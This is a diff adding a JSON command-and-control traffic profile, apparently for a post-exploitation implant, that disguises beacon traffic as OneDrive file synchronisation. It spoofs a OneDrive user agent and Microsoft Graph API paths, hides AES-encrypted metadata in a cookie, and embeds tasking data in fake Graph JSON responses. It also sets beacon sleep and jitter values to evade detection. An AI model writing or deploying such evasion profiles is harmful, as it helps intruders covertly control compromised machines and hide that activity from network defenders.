@@ -1,0 +1,65 @@
+{
+  "name": "onedrive_sync",
+  "description": "伪装为 OneDrive 文件同步流量",
+  "author": "Cerberus",
+
+  "global": {
+    "sleep_ms": 20000,
+    "jitter_pct": 30,
+    "max_retry": 3,
+    "user_agent": "Microsoft OneDrive 24.030.0211.0003 (Windows; Enterprise)"
+  },
+
+  "crypto": {
+    "aes_key": "",
+    "aes_iv": ""
+  },
+
+  "http_get": {
+    "uri_paths": ["/v1.0/me/drive/root/delta?token={}", "/v1.0/me/drive/items/{}/content", "/v1.0/drives/{}/items"],
+    "cookie_name": "MUID",
+    "headers": {
+      "Accept": "application/json",
+      "Accept-Encoding": "gzip, deflate",
+      "Connection": "keep-alive",
+      "X-RequestStats": "Is498=no",
+      "X-HttpMethodOverride": "GET",
+      "Prefer": "respond-async",
+      "Application": "OneDriveSync"
+    },
+    "metadata": {
+      "transform": "base64_aes",
+      "location": "cookie"
+    }
+  },
+
+  "http_post": {
+    "uri_paths": ["/v1.0/me/drive/items/{}/createUploadSession", "/v1.0/drives/{}/items/root:/upload"],
+    "cookie_name": "MUID",
+    "content_type": "application/json",
+    "headers": {
+      "Accept": "application/json",
+      "Connection": "keep-alive",
+      "X-RequestStats": "IsUpload=yes",
+      "Application": "OneDriveSync"
+    },
+    "body": {
+      "transform": "aes"
+    }
+  },
+
+  "http_response": {
+    "content_type": "application/json; odata.metadata=minimal",
+    "headers": {
+      "X-Content-Type-Options": "nosniff",
+      "X-AsmVersion": "UNDEFINED",
+      "X-MSDAVEXT_Error": "917656; Access+denied",
+      "Strict-Transport-Security": "max-age=31536000"
+    },
+    "body_template": "{\"@odata.context\":\"https://graph.microsoft.com/v1.0/$metadata#drives\",\"value\":[{\"id\":\"b!{{DATA}}\",\"driveType\":\"business\",\"name\":\"OneDrive\"}]}",
+    "data_marker": "\"id\":\"b!",
+    "data_delimiter_start": "\"id\":\"b!",
+    "data_delimiter_end": "\",\"driveType\"",
+    "no_task_value": "UYz2QVy4ydqbZejA9lTAzQ=="
+  }
+}
